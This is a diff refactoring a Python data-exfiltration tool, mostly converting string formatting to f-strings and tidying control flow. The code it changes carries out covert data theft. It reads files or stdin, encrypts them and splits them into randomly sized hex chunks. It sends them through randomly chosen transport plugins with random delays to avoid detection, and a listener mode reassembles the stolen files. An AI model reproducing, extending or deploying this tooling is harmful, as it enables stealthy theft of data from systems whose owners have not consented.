@@ -50,19 +50,19 @@ class bcolors:
 
 
 def display_message(message):
-    print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))
+    print(f'[{time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime())}] {message}')
 
 
 def warning(message):
-    display_message("%s%s%s" % (bcolors.WARNING, message, bcolors.ENDC))
+    display_message(f"{bcolors.WARNING}{message}{bcolors.ENDC}")
 
 
 def ok(message):
-    display_message("%s%s%s" % (bcolors.OKGREEN, message, bcolors.ENDC))
+    display_message(f"{bcolors.OKGREEN}{message}{bcolors.ENDC}")
 
 
 def info(message):
-    display_message("%s%s%s" % (bcolors.OKBLUE, message, bcolors.ENDC))
+    display_message(f"{bcolors.OKBLUE}{message}{bcolors.ENDC}")
 
 
 # http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
@@ -104,7 +104,7 @@ def aes_decrypt(message, key=KEY):
         message = aes.decrypt(message)
 
         # Remove PKCS5 padding
-        unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+        unpad = lambda s: s[:-ord(s[-1:])]
 
         return unpad(message)
     except:
@@ -179,10 +179,11 @@ class Exfiltration(object):
         return plugin_name, self.plugins[plugin_name]['send']
 
     def use_plugin(self, plugins):
-        tmp = {}
-        for plugin_name in plugins.split(','):
-            if (plugin_name in self.plugins):
-                tmp[plugin_name] = self.plugins[plugin_name]
+        tmp = {
+            plugin_name: self.plugins[plugin_name]
+            for plugin_name in plugins.split(',')
+            if (plugin_name in self.plugins)
+        }
         self.plugins.clear()
         self.plugins = tmp
 
@@ -203,8 +204,9 @@ class Exfiltration(object):
             files[jobid]['data'] = []
             files[jobid]['packets_order'] = []
             files[jobid]['packets_len'] = -1
-            warning("Register packet for file %s with checksum %s" %
-                    (files[jobid]['filename'], files[jobid]['checksum']))
+            warning(
+                f"Register packet for file {files[jobid]['filename']} with checksum {files[jobid]['checksum']}"
+            )
 
     def retrieve_file(self, jobid):
         global files
@@ -213,7 +215,7 @@ class Exfiltration(object):
             os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
         #Reorder packets before reassembling / ugly one-liner hack
         files[jobid]['packets_order'], files[jobid]['data'] = \
-                [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
+                    [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
         content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
         content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
@@ -226,9 +228,9 @@ class Exfiltration(object):
             raise e
 
         if (files[jobid]['checksum'] == md5(open(filename))):
-            ok("File %s recovered" % (fname))
+            ok(f"File {fname} recovered")
         else:
-            warning("File %s corrupt!" % (fname))
+            warning(f"File {fname} corrupt!")
 
         del files[jobid]
 
@@ -244,7 +246,6 @@ class Exfiltration(object):
                 # register packet
                 if (message[2] == "REGISTER"):
                     self.register_file(message)
-                # done packet
                 elif (message[2] == "DONE"):
                     files[jobid]['packets_len'] = int(message[1])
                     #Check if all packets have arrived
@@ -252,18 +253,14 @@ class Exfiltration(object):
                         self.retrieve_file(jobid)
                     else:
                         warning("[!] Received the last packet, but some are still missing. Waiting for the rest...")
-                # data packet
-                else:
-                    # making sure there's a jobid for this file
-                    if (jobid in files and message[1] not in files[jobid]['packets_order']):
-                        files[jobid]['data'].append(''.join(message[2:]))
-                        files[jobid]['packets_order'].append(int(message[1]))
-                        #In case this packet was the last missing one
-                        if files[jobid]['packets_len'] == len(files[jobid]['data']):
-                            self.retrieve_file(jobid)
+                elif (jobid in files and message[1] not in files[jobid]['packets_order']):
+                    files[jobid]['data'].append(''.join(message[2:]))
+                    files[jobid]['packets_order'].append(int(message[1]))
+                    #In case this packet was the last missing one
+                    if files[jobid]['packets_len'] == len(files[jobid]['data']):
+                        self.retrieve_file(jobid)
         except:
             raise
-            pass
 
 
 class ExfiltrateFile(threading.Thread):
@@ -281,13 +278,11 @@ class ExfiltrateFile(threading.Thread):
         # checksum
         if self.file_to_send == 'stdin':
             file_content = sys.stdin.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
         else:
             with open(self.file_to_send, 'rb') as f:
                 file_content = f.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
+        buf = StringIO(file_content)
+        e = StringIO(file_content)
         self.checksum = md5(buf)
         del file_content
 
@@ -296,12 +291,11 @@ class ExfiltrateFile(threading.Thread):
         ok("Using {0} as transport method".format(plugin_name))
 
         warning("[!] Registering packet for the file")
-        data = "%s|!|%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send), self.checksum)
+        data = f"{self.jobid}|!|{os.path.basename(self.file_to_send)}|!|REGISTER|!|{self.checksum}"
         plugin_send_function(data)
 
         time_to_sleep = randint(1, MAX_TIME_SLEEP)
-        info("Sleeping for %s seconds" % time_to_sleep)
+        info(f"Sleeping for {time_to_sleep} seconds")
         time.sleep(time_to_sleep)
 
         # sending the data
@@ -314,7 +308,7 @@ class ExfiltrateFile(threading.Thread):
         e.close()
 
         packet_index = 0
-        while (True):
+        while True:
             data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
             if not data_file:
                 break
@@ -322,18 +316,18 @@ class ExfiltrateFile(threading.Thread):
             ok("Using {0} as transport method".format(plugin_name))
             # info("Sending %s bytes packet" % len(data_file))
 
-            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
+            data = f"{self.jobid}|!|{packet_index}|!|{data_file}"
             plugin_send_function(data)
             packet_index = packet_index + 1
 
             time_to_sleep = randint(1, MAX_TIME_SLEEP)
-            display_message("Sleeping for %s seconds" % time_to_sleep)
+            display_message(f"Sleeping for {time_to_sleep} seconds")
             time.sleep(time_to_sleep)
 
         # last packet
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
         ok("Using {0} as transport method".format(plugin_name))
-        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
+        data = f"{self.jobid}|!|{packet_index}|!|DONE"
         plugin_send_function(data)
         f.close()
         sys.exit(0)
@@ -398,7 +392,7 @@ def main():
     app = Exfiltration(results, KEY)
 
     # LISTEN/PROXY MODE
-    if (results.listen or results.proxy):
+    if results.listen or results.proxy:
         threads = []
         plugins = app.get_plugins()
         for plugin in plugins:
@@ -409,19 +403,20 @@ def main():
             thread.daemon = True
             thread.start()
             threads.append(thread)
-    # EXFIL mode
     else:
         if (results.folder is None and results.file is None):
             warning("[!] Specify a file or a folder!")
             parser.print_help()
             sys.exit(-1)
-        if (results.folder):
-            files = ["{0}{1}".format(results.folder, f) for
-                     f in listdir(results.folder)
-                     if isfile(join(results.folder, f))]
-        else:
-            files = list(set(results.file))
-
+        files = (
+            [
+                "{0}{1}".format(results.folder, f)
+                for f in listdir(results.folder)
+                if isfile(join(results.folder, f))
+            ]
+            if results.folder
+            else list(set(results.file))
+        )
         threads = []
         for file_to_send in files:
             info("Launching thread for file {0}".format(file_to_send))
